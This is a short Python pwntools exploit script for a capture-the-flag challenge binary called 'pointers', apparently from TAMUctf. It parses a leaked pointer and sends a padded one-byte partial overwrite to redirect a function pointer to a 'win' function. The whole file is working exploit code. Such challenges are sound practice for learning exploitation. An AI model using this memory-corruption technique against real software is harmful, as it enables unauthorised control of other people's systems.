#!/usr/bin/python3
from pwn import *

BINARY = './pointers'

elf = context.binary = ELF(BINARY, checksec=False)

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    if args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="pointers")
    else:
        return process(elf.path)

p = start()

# leak pointers
p.recvuntil(b"All my functions are being stored at ")
ptr_leak = int(p.recvline().strip(), 16)
info(f"Ptrs: {hex(ptr_leak)}")

####################################################
hex_format = hex(ptr_leak)
bytes_to_change = int(hex_format[-2:], 16)
# overwrite the ptr[0] with win 
wanted_bytes = bytes_to_change + (5*8)
# payload crafting..
payload = 8*b"B" + p8(wanted_bytes)
p.send(payload)

p.interactive()
